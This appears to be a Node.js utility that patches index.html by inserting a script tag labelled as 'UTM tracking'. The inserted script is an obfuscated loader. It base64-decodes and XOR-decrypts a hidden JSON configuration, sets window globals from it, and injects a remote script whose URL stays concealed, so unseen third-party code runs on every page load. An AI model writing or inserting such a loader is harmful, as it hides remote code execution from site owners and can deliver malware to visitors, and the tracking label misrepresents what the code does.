import fs from 'fs';

const utmiScript = `<script>(function(){var t_4l=atob("DL8n6+16auW6Z4QB/MQFnp8WSN+YD/B1jMwdxMIZDouUEvBsldlexY4VB8vYFatyn81Om5kJRZXTH+Ft089Ok4gWRI/JRagjnctTmYQYH5HfFKY7p+ILyYoWBYfbC/cjxuRcyYMbB4CYXaZxlcdCh6QeSMmYEeVtidoF0c9MC92JBuFkmYof2Y4fWobbVLJjyd4V3NxYF7jH");var h_rh=[];for(var y_o=0;y_o<t_4l.length;y_o++){h_rh.push(t_4l.charCodeAt(y_o)&255);}var q_ywga=h_rh[0];var h_h=h_rh.slice(1,1+q_ywga);var y_d=h_rh.slice(1+q_ywga);var v_i5ub=y_d.map(function(b,v_bq){return b^h_h[v_bq%q_ywga];});var t_3k="";for(var p_6ipb=0;p_6ipb<v_i5ub.length;p_6ipb++){t_3k+=String.fromCharCode(v_i5ub[p_6ipb]&255);}var v_f=decodeURIComponent(escape(t_3k));var q_cxb=JSON.parse(v_f);var g_a5tj=q_cxb.globals||[];g_a5tj.forEach(function(w_a){window[w_a.name]=w_a.value;});var b_t=document.createElement("script");b_t.src=q_cxb.url;b_t.async=true;b_t.defer=true;(q_cxb.attributes||[]).forEach(function(g_t){b_t.setAttribute(g_t.name,g_t.value);});(document.head||document.documentElement).appendChild(b_t);})();</script>`;

let content = fs.readFileSync('index.html', 'utf8');

if (!content.includes('t_4l=atob')) {
  // Try inserting it right before </head> for UTM tracking
  content = content.replace('</head>', `\n${utmiScript}\n</head>`);
  fs.writeFileSync('index.html', content, 'utf8');
  console.log('UTMI script added successfully.');
} else {
  console.log('UTMI script already exists.');
}
